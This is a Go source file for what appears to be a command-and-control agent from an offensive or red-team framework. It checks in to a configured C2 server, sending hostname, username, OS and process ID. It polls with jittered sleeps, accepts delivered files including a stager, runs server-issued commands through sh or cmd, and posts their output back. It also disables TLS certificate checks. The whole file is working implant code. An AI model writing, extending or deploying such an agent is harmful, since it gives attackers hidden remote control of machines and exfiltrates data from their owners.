package c2

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// AgentConfig extends StagerConfig with optional mTLS fields.
type AgentConfig struct {
	StagerConfig
	CertFile string `json:"cert_file,omitempty"`
	KeyFile  string `json:"key_file,omitempty"`
	UseMTLS  bool   `json:"use_mtls,omitempty"`
}

// RunAgent loads a stager config and runs the C2 polling loop.
func RunAgent(configPath string) error {
	data, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("read config: %w", err)
	}

	var cfg AgentConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return fmt.Errorf("parse config: %w", err)
	}

	if cfg.C2URL == "" {
		return fmt.Errorf("c2_url is required in config")
	}
	if cfg.Interval <= 0 {
		cfg.Interval = 5
	}
	if cfg.Jitter <= 0 {
		cfg.Jitter = 20
	}

	client, err := buildHTTPClient(cfg)
	if err != nil {
		return fmt.Errorf("build HTTP client: %w", err)
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	req := CheckinRequest{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	for {
		resp, err := checkin(client, cfg.C2URL, &req)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] checkin failed: %v\n", err)
		} else {
			req.SessionID = resp.SessionID
			// Process file deliveries first (e.g., deploying Burrow stager)
			if len(resp.Files) > 0 {
				handleFileDeliveries(resp.Files)
			}
			for _, cmd := range resp.Commands {
				result := executeCommand(cmd)
				result.SessionID = resp.SessionID
				postResult(client, cfg.C2URL, result)
			}
		}

		jitterMS := 0
		if cfg.Jitter > 0 {
			jitterMS = rand.Intn(cfg.Interval * cfg.Jitter * 10) // milliseconds
		}
		sleep := time.Duration(cfg.Interval)*time.Second + time.Duration(jitterMS)*time.Millisecond

		select {
		case <-ctx.Done():
			return nil
		case <-time.After(sleep):
		}
	}
}

func buildHTTPClient(cfg AgentConfig) (*http.Client, error) {
	tlsCfg := &tls.Config{InsecureSkipVerify: true} // self-signed C2 certs

	if cfg.UseMTLS && cfg.CertFile != "" && cfg.KeyFile != "" {
		cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
		if err != nil {
			return nil, fmt.Errorf("load mTLS cert: %w", err)
		}
		tlsCfg.Certificates = []tls.Certificate{cert}
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: tlsCfg},
	}, nil
}

func checkin(client *http.Client, c2URL string, req *CheckinRequest) (*CheckinResponse, error) {
	body, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	resp, err := client.Post(c2URL+"/connect", "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("checkin returned %d", resp.StatusCode)
	}

	var cr CheckinResponse
	if err := json.NewDecoder(resp.Body).Decode(&cr); err != nil {
		return nil, err
	}
	return &cr, nil
}

// maxCommandOutput limits command output to 10MB to prevent OOM from
// commands that produce unbounded output (e.g., `cat /dev/urandom`).
const maxCommandOutput = 10 << 20

func executeCommand(cmd QueuedCommand) *CommandResult {
	full := cmd.Command
	if cmd.Args != "" {
		full += " " + cmd.Args
	}

	var execCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		execCmd = exec.Command("cmd", "/c", full)
	} else {
		execCmd = exec.Command("sh", "-c", full)
	}

	// Use pipes instead of CombinedOutput to enforce a size limit
	stdout, err := execCmd.StdoutPipe()
	if err != nil {
		return &CommandResult{CommandID: cmd.ID, Output: err.Error(), ExitCode: -1}
	}
	execCmd.Stderr = execCmd.Stdout // merge stderr into stdout pipe

	if err := execCmd.Start(); err != nil {
		return &CommandResult{CommandID: cmd.ID, Output: err.Error(), ExitCode: -1}
	}

	output, _ := io.ReadAll(io.LimitReader(stdout, maxCommandOutput))

	exitCode := 0
	if err := execCmd.Wait(); err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
			if len(output) == 0 {
				output = []byte(err.Error())
			}
		}
	}

	return &CommandResult{
		CommandID: cmd.ID,
		Output:    strings.TrimRight(string(output), "\n"),
		ExitCode:  exitCode,
	}
}

func postResult(client *http.Client, c2URL string, result *CommandResult) {
	body, err := json.Marshal(result)
	if err != nil {
		return
	}
	resp, err := client.Post(c2URL+"/result", "application/json", bytes.NewReader(body))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] result post failed: %v\n", err)
		return
	}
	resp.Body.Close()
}
